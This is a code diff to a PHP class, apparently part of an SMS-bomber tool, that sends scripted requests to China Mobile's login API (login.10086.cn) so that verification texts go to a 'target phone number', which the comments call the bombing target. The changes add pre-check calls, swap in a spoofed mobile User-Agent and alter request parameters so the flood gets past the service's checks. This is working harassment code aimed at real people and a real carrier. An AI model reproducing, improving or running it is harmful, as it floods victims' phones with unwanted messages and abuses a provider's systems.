@@ -21,20 +21,36 @@ class DestoryLogic
             'Cache-Control:no-cache',
             'Content-Type:application/x-www-form-urlencoded; charset=UTF-8',
             'Cookie:CaptchaCode=' . $captcha_code . '; sendflag=' . $tempstamp,
-            'Host:login.10086.cn',
             'Origin:https://login.10086.cn',
             'Pragma:no-cache',
-            'Referer:https://login.10086.cn/html/login/touch.html?channelID=12034&backUrl=http%3A%2F%2Fwww.10086.cn%2Findex%2Fsd%2Findex_531_531.html&tdsourcetag=s_pcqq_aiomsg',
-            'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
+            'Referer:https://login.10086.cn/html/login/touch.html',
+            'User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
             'X-Requested-With:XMLHttpRequest',
         ];
         $data = [
             'userName' => $target_mobile, // 轰炸目标手机号
         ];
+
+
+
+        // ACTION 0: 检测是否可用
+        $api     = 'https://login.10086.cn/checkUidAvailable.action';
+        $content = CurlRequest::run($api, http_build_query($data), $header);
+        
+
         // ACTION 1: 检测是否可以下发短信
         $api     = 'https://login.10086.cn/chkNumberAction.action';
         $content = CurlRequest::run($api, http_build_query($data), $header);
         if ('true' == $content) {
+            // ACTION 1.1 检测是否需要
+            $data = [
+                'userName'  => $target_mobile, // 轰炸目标手机号
+                'pwdType'   => '02',
+                'timestamp' => $tempstamp,
+            ];
+            $api     = "https://login.10086.cn/needVerifyCode.htm?" . http_build_query($data);
+            $content = CurlRequest::run($api, null, $header);
+
             // ACTION 2: 获取下发短信的 token
             $data = [
                 'userName' => $target_mobile, // 轰炸目标手机号
@@ -49,11 +65,12 @@ class DestoryLogic
                 $data = [
                     'userName'  => $target_mobile, // 轰炸目标手机号
                     'type'      => '01',
-                    'channelID' => '12034',
+                    'channelID' => '12014',
                 ];
                 $api      = 'https://login.10086.cn/sendRandomCodeAction.action';
                 $header[] = 'Xa-before:' . $token;
-                $content  = CurlRequest::run($api, http_build_query($data), $header);
+
+                $content = CurlRequest::run($api, http_build_query($data), $header);
                 if ('0' == $content) {
                     \LogService::debug(__CLASS__ . '@' . __FUNCTION__ . '.success',
                         compact('target_mobile')
@@ -63,6 +80,7 @@ class DestoryLogic
                         compact('target_mobile')
                     );
                 } else {
+                    $data = http_build_query($data);
                     \LogService::debug(__CLASS__ . '@' . __FUNCTION__ . '.Failed',
                         compact('header', 'api', 'data', 'content')
                     );
